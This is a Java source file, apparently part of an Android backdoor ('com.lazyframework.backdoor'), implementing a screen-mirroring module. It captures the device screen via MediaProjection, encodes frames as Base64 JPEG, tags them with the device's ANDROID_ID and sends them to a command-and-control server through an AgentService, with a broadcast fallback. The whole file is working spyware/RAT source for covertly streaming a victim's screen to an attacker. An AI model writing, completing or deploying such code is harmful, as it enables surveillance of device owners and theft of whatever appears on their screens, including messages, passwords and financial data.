package com.lazyframework.backdoor;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.provider.Settings;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import androidx.annotation.RequiresApi;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.atomic.AtomicBoolean;

@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
public class ScreenMirrorHelper {

    private static final String TAG = "ScreenMirrorHelper";
    
    // ==================== CONFIGURATION ====================
    private static final int QUALITY = 65;
    private static final long MIN_INTERVAL = 500;  // 2 FPS max
    private static final int MAX_RETRY = 3;
    private static final int FRAME_MONITOR_INTERVAL = 3000;

    // ==================== CONTEXT & THREADS ====================
    private Context context;
    private Handler handler;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;

    // ==================== MEDIA PROJECTION ====================
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;

    // ==================== STATE ====================
    private AtomicBoolean isCapturing = new AtomicBoolean(false);
    private AtomicBoolean isPaused = new AtomicBoolean(false);
    private long lastCaptureTime = 0;
    private int frameCount = 0;
    private int errorCount = 0;
    private boolean isInitialized = false;

    // ==================== SCREEN DIMENSIONS ====================
    private int screenWidth = 0;
    private int screenHeight = 0;
    private int screenDensity = 0;

    // ==================== CONSTRUCTOR ====================

    public ScreenMirrorHelper() {
        Log.d(TAG, "🏗️ ScreenMirrorHelper constructed");
    }

    // ==================== INITIALIZATION ====================

    /**
     * Initialize the helper with context
     * Must be called before startScreenCapture()
     */
    public void onCreate(Context ctx) {
        this.context = ctx;
        Log.d(TAG, "📱 onCreate called");

        // Create background thread for image processing
        backgroundThread = new HandlerThread("ScreenMirrorThread");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());

        // Main thread handler
        handler = new Handler(Looper.getMainLooper());

        // Get screen dimensions
        getScreenDimensions();

        isInitialized = true;
        Log.d(TAG, "✅ ScreenMirrorHelper initialized");
        Log.d(TAG, "📱 Screen: " + screenWidth + "x" + screenHeight + " @ " + screenDensity + "dpi");

        // Register with ServiceController
        ServiceController.setScreenMirrorHelper(this);
        Log.d(TAG, "✅ Registered with ServiceController");
    }

    // ==================== SCREEN DIMENSIONS ====================

    /**
     * Get screen dimensions from WindowManager
     */
    private void getScreenDimensions() {
        try {
            if (context == null) {
                setDefaultDimensions();
                return;
            }

            WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
            if (wm == null) {
                setDefaultDimensions();
                return;
            }

            DisplayMetrics metrics = new DisplayMetrics();
            wm.getDefaultDisplay().getMetrics(metrics);

            screenWidth = metrics.widthPixels;
            screenHeight = metrics.heightPixels;
            screenDensity = metrics.densityDpi;

            // Validate
            if (screenWidth <= 0 || screenHeight <= 0) {
                setDefaultDimensions();
            }

            Log.d(TAG, "📱 Screen dimensions: " + screenWidth + "x" + screenHeight);

        } catch (Exception e) {
            Log.e(TAG, "Error getting screen dimensions: " + e.getMessage());
            setDefaultDimensions();
        }
    }

    /**
     * Set default dimensions as fallback
     */
    private void setDefaultDimensions() {
        screenWidth = 1080;
        screenHeight = 1920;
        screenDensity = 420;
        Log.d(TAG, "📱 Using default dimensions: 1080x1920 @ 420dpi");
    }

    // ==================== START SCREEN CAPTURE ====================

    /**
     * Start screen capture with MediaProjection
     * 
     * @param projection MediaProjection instance from user permission
     */
    public synchronized void startScreenCapture(MediaProjection projection) {
        Log.d(TAG, "🔄 startScreenCapture called");

        // ==================== VALIDATION CHECKS ====================

        // Check if already capturing
        if (isCapturing.get()) {
            Log.d(TAG, "⚠️ Already capturing, ignoring start request");
            return;
        }

        // Check if helper is initialized
        if (!isInitialized) {
            Log.e(TAG, "❌ Helper not initialized. Call onCreate() first");
            notifyMirrorError("Helper not initialized");
            return;
        }

        // Check if projection is valid
        if (projection == null) {
            Log.e(TAG, "❌ MediaProjection is null");
            notifyMirrorError("MediaProjection is null");
            return;
        }

        // Check if context is valid
        if (context == null) {
            Log.e(TAG, "❌ Context is null");
            notifyMirrorError("Context is null");
            return;
        }

        // Validate dimensions
        if (screenWidth <= 0 || screenHeight <= 0) {
            getScreenDimensions();
            if (screenWidth <= 0 || screenHeight <= 0) {
                setDefaultDimensions();
            }
        }

        Log.d(TAG, "📱 Screen: " + screenWidth + "x" + screenHeight + " @ " + screenDensity + "dpi");

        try {
            // ==================== SETUP MEDIA PROJECTION ====================

            this.mediaProjection = projection;

            // Register callback for when projection stops
            this.mediaProjection.registerCallback(new MediaProjection.Callback() {
                @Override
                public void onStop() {
                    Log.d(TAG, "🛑 MediaProjection stopped by system");
                    isCapturing.set(false);
                    
                    // Cleanup resources
                    cleanup();

                    // Notify AgentService via ServiceController
                    AgentService service = ServiceController.getAgentService();
                    if (service != null) {
                        service.onMirrorStopped();
                        service.sendMirrorStatus(false);
                        Log.d(TAG, "📤 Mirror stopped callback sent via ServiceController");
                    } else {
                        Log.w(TAG, "⚠️ AgentService not available for stop callback");
                        // Send broadcast as fallback
                        sendMirrorStatusBroadcast(false);
                    }
                }
            }, backgroundHandler);

            // ==================== SETUP IMAGE READER ====================

            // Clean up any existing image reader
            if (imageReader != null) {
                try {
                    imageReader.close();
                } catch (Exception e) {
                    Log.w(TAG, "Error closing old ImageReader: " + e.getMessage());
                }
                imageReader = null;
            }

            // Create ImageReader with RGBA_8888 format
            imageReader = ImageReader.newInstance(
                screenWidth,
                screenHeight,
                PixelFormat.RGBA_8888,
                2  // Max images to keep
            );

            if (imageReader == null) {
                Log.e(TAG, "❌ Failed to create ImageReader");
                notifyMirrorError("Failed to create ImageReader");
                cleanup();
                return;
            }

            // ==================== SETUP VIRTUAL DISPLAY ====================

            // Clean up any existing virtual display
            if (virtualDisplay != null) {
                try {
                    virtualDisplay.release();
                } catch (Exception e) {
                    Log.w(TAG, "Error releasing old VirtualDisplay: " + e.getMessage());
                }
                virtualDisplay = null;
            }

            // Create VirtualDisplay
            virtualDisplay = mediaProjection.createVirtualDisplay(
                "LazyFramework_Mirror",
                screenWidth,
                screenHeight,
                screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null,
                backgroundHandler
            );

            if (virtualDisplay == null) {
                Log.e(TAG, "❌ VirtualDisplay creation failed");
                notifyMirrorError("VirtualDisplay creation failed");
                cleanup();
                return;
            }

            // ==================== SETUP IMAGE LISTENER ====================

            // Set listener for new images
            imageReader.setOnImageAvailableListener(
                this::processImage,
                backgroundHandler
            );

            // ==================== UPDATE STATE ====================

            isCapturing.set(true);
            isPaused.set(false);
            frameCount = 0;
            errorCount = 0;

            Log.d(TAG, "✅ Screen capture STARTED successfully");
            Log.d(TAG, "📊 VirtualDisplay: " + screenWidth + "x" + screenHeight + " @ " + screenDensity + "dpi");

            // ==================== NOTIFY AGENT SERVICE ====================

            // Get AgentService from ServiceController
            AgentService service = ServiceController.getAgentService();

            if (service != null) {
                // Notify mirror started
                service.onMirrorStarted();
                Log.d(TAG, "📤 onMirrorStarted() called via ServiceController");

                // Send mirror status
                service.sendMirrorStatus(true);
                Log.d(TAG, "📤 sendMirrorStatus(true) sent via ServiceController");

            } else {
                Log.w(TAG, "⚠️ AgentService not available via ServiceController");
                Log.w(TAG, "   Status: " + ServiceController.getDebugInfo());

                // Try to register again
                AgentService retryService = ServiceController.getAgentService();
                if (retryService != null) {
                    retryService.onMirrorStarted();
                    retryService.sendMirrorStatus(true);
                    Log.d(TAG, "📤 Retry: Mirror status sent successfully");
                } else {
                    // Send broadcast as fallback
                    sendMirrorStatusBroadcast(true);
                    Log.d(TAG, "📤 Fallback: Mirror status broadcast sent");
                }
            }

            // ==================== START MONITOR ====================

            // Start frame monitor
            startFrameMonitor();

        } catch (SecurityException e) {
            Log.e(TAG, "❌ Security exception: " + e.getMessage(), e);
            notifyMirrorError("Security: " + e.getMessage());
            cleanup();
            isCapturing.set(false);

        } catch (IllegalStateException e) {
            Log.e(TAG, "❌ Illegal state: " + e.getMessage(), e);
            notifyMirrorError("Illegal state: " + e.getMessage());
            cleanup();
            isCapturing.set(false);

        } catch (Exception e) {
            Log.e(TAG, "❌ Unexpected error: " + e.getMessage(), e);
            notifyMirrorError("Error: " + e.getMessage());
            cleanup();
            isCapturing.set(false);

            // Try to recover
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                try {
                    Log.d(TAG, "🔄 Attempting recovery...");
                    if (mediaProjection != null) {
                        mediaProjection.stop();
                        mediaProjection = null;
                    }
                    Thread.sleep(1000);
                    getScreenDimensions();
                } catch (Exception recoveryError) {
                    Log.e(TAG, "❌ Recovery failed: " + recoveryError.getMessage());
                }
            }
        }
    }

    // ==================== FRAME MONITOR ====================

    /**
     * Start monitoring frame count
     */
    private void startFrameMonitor() {
        if (backgroundHandler == null) return;

        backgroundHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isCapturing.get()) return;

                int currentFrames = frameCount;
                if (currentFrames > 0) {
                    Log.d(TAG, "📊 Frames captured: " + currentFrames);
                } else {
                    Log.w(TAG, "⚠️ No frames captured yet. Check if screen is active.");
                }

                // Schedule next check
                if (isCapturing.get()) {
                    backgroundHandler.postDelayed(this, FRAME_MONITOR_INTERVAL);
                }
            }
        }, 5000);
    }

    // ==================== PROCESS IMAGE ====================

    /**
     * Process image from ImageReader
     */
    private void processImage(ImageReader reader) {
    if (!isCapturing.get() || isPaused.get()) {
        return;
    }

    if (reader == null) {
        Log.w(TAG, "⚠️ ImageReader is null in processImage");
        return;
    }

    Image image = null;
    try {
        long now = System.currentTimeMillis();

        // Throttle frame capture
        if (now - lastCaptureTime < MIN_INTERVAL) {
            return;
        }
        lastCaptureTime = now;

        image = reader.acquireLatestImage();
        if (image == null) {
            Log.w(TAG, "⚠️ No image available in processImage");
            return;
        }

        Log.d(TAG, "📸 Image acquired: " + image.getWidth() + "x" + image.getHeight());

        // Convert image to bitmap
        Bitmap bitmap = imageToBitmap(image);
        if (bitmap == null) {
            Log.w(TAG, "⚠️ Bitmap conversion failed");
            errorCount++;
            if (errorCount > MAX_RETRY) {
                Log.w(TAG, "⚠️ Too many errors (" + errorCount + "), resetting...");
                resetCapture();
            }
            return;
        }

        Log.d(TAG, "🖼️ Bitmap created: " + bitmap.getWidth() + "x" + bitmap.getHeight());

        // Compress to JPEG
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, QUALITY, baos);
        bitmap.recycle();

        byte[] jpegData = baos.toByteArray();
        baos.close();

        Log.d(TAG, "📦 JPEG size: " + jpegData.length + " bytes");

        // Validate JPEG data
        if (jpegData == null || jpegData.length < 1000) {
            Log.w(TAG, "⚠️ JPEG data too small (" + (jpegData != null ? jpegData.length : 0) + " bytes), skipping");
            return;
        }

        // ✅ INCREMENT FRAME COUNT
        frameCount++;
        Log.d(TAG, "📊 Frame #" + frameCount + " captured, size: " + jpegData.length + " bytes");

        // Send frame to C2
        boolean sent = sendFrameToAgent(jpegData);
        
        // ✅ Reset error count on success
        if (sent) {
            errorCount = 0;
            Log.d(TAG, "✅ Frame #" + frameCount + " processed successfully");
        } else {
            Log.w(TAG, "⚠️ Frame #" + frameCount + " failed to send");
            errorCount++;
        }

    } catch (OutOfMemoryError e) {
        Log.e(TAG, "❌ Out of memory: " + e.getMessage());
        System.gc();
    } catch (Exception e) {
        Log.e(TAG, "❌ Process image error: " + e.getMessage(), e);
        errorCount++;
    } finally {
        if (image != null) {
            try {
                image.close();
            } catch (Exception e) {
                // Ignore
            }
        }
    }
}

    // ==================== IMAGE TO BITMAP ====================

    /**
     * Convert Image to Bitmap
     */
    private Bitmap imageToBitmap(Image image) {
        if (image == null) return null;

        try {
            Image.Plane[] planes = image.getPlanes();
            if (planes == null || planes.length == 0) {
                return null;
            }

            ByteBuffer buffer = planes[0].getBuffer();
            if (buffer == null) {
                return null;
            }

            int width = image.getWidth();
            int height = image.getHeight();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();

            // Create bitmap with ARGB_8888 format
            Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);

            // Handle row padding if needed
            if (rowStride == pixelStride * width) {
                // No padding, direct copy
                bitmap.copyPixelsFromBuffer(buffer);
            } else {
                // Copy with padding handling
                ByteBuffer dstBuffer = ByteBuffer.allocate(width * height * 4);
                for (int row = 0; row < height; row++) {
                    buffer.position(row * rowStride);
                    byte[] rowData = new byte[width * 4];
                    buffer.get(rowData);
                    dstBuffer.put(rowData);
                }
                dstBuffer.rewind();
                bitmap.copyPixelsFromBuffer(dstBuffer);
            }

            return bitmap;

        } catch (IllegalArgumentException e) {
            Log.e(TAG, "Invalid image format: " + e.getMessage());
            return null;
        } catch (Exception e) {
            Log.e(TAG, "Image to bitmap error: " + e.getMessage());
            return null;
        }
    }

    // ==================== SEND FRAME TO AGENT ====================

    /**
     * Send frame to AgentService via ServiceController
     *
     * @return
     */
    private boolean sendFrameToAgent(byte[] jpegData) {
    if (jpegData == null || jpegData.length == 0) {
        Log.w(TAG, "⚠️ JPEG data is null or empty");
        return false;
    }

    try {
        String base64 = Base64.encodeToString(jpegData, Base64.NO_WRAP);
        if (base64 == null || base64.isEmpty()) {
            Log.w(TAG, "⚠️ Base64 encoding failed");
            return false;
        }

        Log.d(TAG, "📤 Frame #" + frameCount + " size: " + jpegData.length + " bytes, base64: " + base64.length() + " chars");

        JSONObject json = new JSONObject();
        json.put("type", "response");
        json.put("agent_id", getAgentId());
        json.put("command", "SCREEN_FRAME");

        JSONObject result = new JSONObject();
        result.put("type", "screen_frame");
        result.put("width", screenWidth);
        result.put("height", screenHeight);
        result.put("data", base64);
        result.put("timestamp", System.currentTimeMillis());
        result.put("frame_number", frameCount);
        result.put("size", jpegData.length);

        json.put("result", result);
        String jsonString = json.toString();

        // ✅ PRIORITAS: Kirim via ServiceController dulu
        AgentService service = ServiceController.getAgentService();
        if (service != null && service.isC2Connected()) {
            service.sendRawData(jsonString);
            Log.d(TAG, "✅ Frame " + frameCount + " sent via ServiceController (C2 connected)");
            return true;
        }

        // ✅ FALLBACK: Kirim via Broadcast
        if (context != null) {
            Intent intent = new Intent("com.lazyframework.SCREEN_FRAME");
            intent.putExtra("frame_data", base64);
            intent.putExtra("width", screenWidth);
            intent.putExtra("height", screenHeight);
            intent.putExtra("frame_number", frameCount);
            intent.putExtra("timestamp", System.currentTimeMillis());
            intent.setPackage(context.getPackageName());
            
            context.sendBroadcast(intent);
            Log.d(TAG, "✅ Frame " + frameCount + " sent via Broadcast (fallback)");
            
            // ✅ TAMBAHKAN: Cek apakah AgentService bisa menerima
            if (service != null) {
                Log.d(TAG, "  - AgentService exists, but C2 status: " + (service.isC2Connected() ? "Connected" : "Disconnected"));
            } else {
                Log.w(TAG, "  - AgentService is NULL!");
            }
            
            return true;
        }

        Log.e(TAG, "❌ No send method available for frame " + frameCount);

    } catch (Exception e) {
        Log.e(TAG, "❌ sendFrameToAgent error: " + e.getMessage(), e);
    }
    return false;
}

// TAMBAHKAN METHOD INI:
private void sendFrameViaBroadcast(String base64) {
    try {
        if (context == null) {
            Log.w(TAG, "⚠️ Context null, cannot send broadcast");
            return;
        }
        
        Intent intent = new Intent("com.lazyframework.SCREEN_FRAME");
        intent.putExtra("frame_data", base64);
        intent.putExtra("width", screenWidth);
        intent.putExtra("height", screenHeight);
        intent.putExtra("frame_number", frameCount);
        intent.putExtra("timestamp", System.currentTimeMillis());
        intent.setPackage(context.getPackageName()); // Explicit untuk keamanan
        
        context.sendBroadcast(intent);
        
        if (frameCount % 10 == 0) {
            Log.d(TAG, "📤 Frame " + frameCount + " sent via broadcast");
        }
    } catch (Exception e) {
        Log.e(TAG, "Broadcast send error: " + e.getMessage());
    }
}

    // ==================== CONTROL METHODS ====================

    /**
     * Pause screen capture
     */
    public void pauseCapture() {
        isPaused.set(true);
        Log.d(TAG, "⏸️ Capture paused");
    }

    /**
     * Resume screen capture
     */
    public void resumeCapture() {
        isPaused.set(false);
        Log.d(TAG, "▶️ Capture resumed");
    }

    /**
     * Stop screen capture
     */
    public void stopScreenCapture() {
        Log.d(TAG, "⏹️ Stopping screen capture...");
        isCapturing.set(false);
        isPaused.set(false);
        cleanup();

        // Notify AgentService via ServiceController
        AgentService service = ServiceController.getAgentService();
        if (service != null) {
            service.onMirrorStopped();
            service.sendMirrorStatus(false);
            Log.d(TAG, "📤 Mirror stopped callback sent via ServiceController");
        } else {
            Log.w(TAG, "⚠️ AgentService not available for stop callback");
            sendMirrorStatusBroadcast(false);
        }
    }

    // ==================== RESET ====================

    /**
     * Reset capture on error
     */
    private void resetCapture() {
        Log.d(TAG, "🔄 Resetting capture...");
        cleanup();
        errorCount = 0;
        isCapturing.set(false);

        // Try to restart
        if (mediaProjection != null) {
            Log.d(TAG, "🔄 Attempting restart...");
            startScreenCapture(mediaProjection);
        }
    }

    // ==================== CLEANUP ====================

    /**
     * Cleanup resources
     */
    private void cleanup() {
        Log.d(TAG, "🧹 Cleaning up resources...");

        try {
            if (virtualDisplay != null) {
                virtualDisplay.release();
                virtualDisplay = null;
                Log.d(TAG, "✅ VirtualDisplay released");
            }
        } catch (Exception e) {
            Log.w(TAG, "Error releasing VirtualDisplay: " + e.getMessage());
        }

        try {
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
                Log.d(TAG, "✅ ImageReader closed");
            }
        } catch (Exception e) {
            Log.w(TAG, "Error closing ImageReader: " + e.getMessage());
        }

        // Clear callbacks
        if (backgroundHandler != null) {
            backgroundHandler.removeCallbacksAndMessages(null);
        }

        Log.d(TAG, "✅ Cleanup complete");
    }

    /**
     * Destroy the helper (final cleanup)
     */
    public void destroy() {
        Log.d(TAG, "💀 Destroying ScreenMirrorHelper...");

        // Stop capture if running
        stopScreenCapture();

        // Cleanup threads
        if (backgroundThread != null) {
            try {
                backgroundThread.quitSafely();
                backgroundThread = null;
            } catch (Exception e) {
                Log.w(TAG, "Error stopping background thread: " + e.getMessage());
            }
        }

        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
            handler = null;
        }

        // Release MediaProjection
        if (mediaProjection != null) {
            try {
                mediaProjection.stop();
                mediaProjection = null;
            } catch (Exception e) {
                Log.w(TAG, "Error stopping MediaProjection: " + e.getMessage());
            }
        }

        // Clear ServiceController reference
        ServiceController.clearMirrorHelper();

        // Clear context
        context = null;
        isInitialized = false;

        Log.d(TAG, "✅ ScreenMirrorHelper destroyed");
    }

    // ==================== GETTERS ====================

    /**
     * Check if currently capturing
     */
    public boolean isCapturing() {
        return isCapturing.get();
    }

    /**
     * Check if paused
     */
    public boolean isPaused() {
        return isPaused.get();
    }

    /**
     * Get frame count
     */
    public int getFrameCount() {
        return frameCount;
    }

    /**
     * Get screen width
     */
    public int getScreenWidth() {
        return screenWidth;
    }

    /**
     * Get screen height
     */
    public int getScreenHeight() {
        return screenHeight;
    }

    // ==================== HELPER METHODS ====================

    /**
     * Get agent ID from device settings
     */
    private String getAgentId() {
        if (context == null) return "unknown";
        try {
            return Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ANDROID_ID
            );
        } catch (Exception e) {
            return "unknown";
        }
    }

    /**
     * Send mirror status via broadcast as fallback
     */
    private void sendMirrorStatusBroadcast(boolean active) {
        try {
            android.content.Intent intent = new android.content.Intent("com.lazyframework.MIRROR_STATUS_BROADCAST");
            intent.putExtra("mirror_active", active);
            intent.putExtra("agent_id", getAgentId());
            intent.putExtra("timestamp", System.currentTimeMillis());

            if (context != null) {
                context.sendBroadcast(intent);
                Log.d(TAG, "📡 Mirror status broadcast sent: " + active);
            }
        } catch (Exception e) {
            Log.e(TAG, "Broadcast error: " + e.getMessage());
        }
    }

    /**
     * Notify mirror error to AgentService
     */
    private void notifyMirrorError(String error) {
        Log.e(TAG, "❌ Mirror error: " + error);

        AgentService service = ServiceController.getAgentService();
        if (service != null) {
            try {
                service.sendMirrorStatus(false);
                Log.d(TAG, "📤 Error status sent to AgentService");
            } catch (Exception e) {
                Log.e(TAG, "Error sending error status: " + e.getMessage());
            }
        }

        // Also send broadcast
        try {
            android.content.Intent intent = new android.content.Intent("com.lazyframework.MIRROR_ERROR");
            intent.putExtra("error", error);
            intent.putExtra("agent_id", getAgentId());
            if (context != null) {
                context.sendBroadcast(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Broadcast error: " + e.getMessage());
        }
    }
}
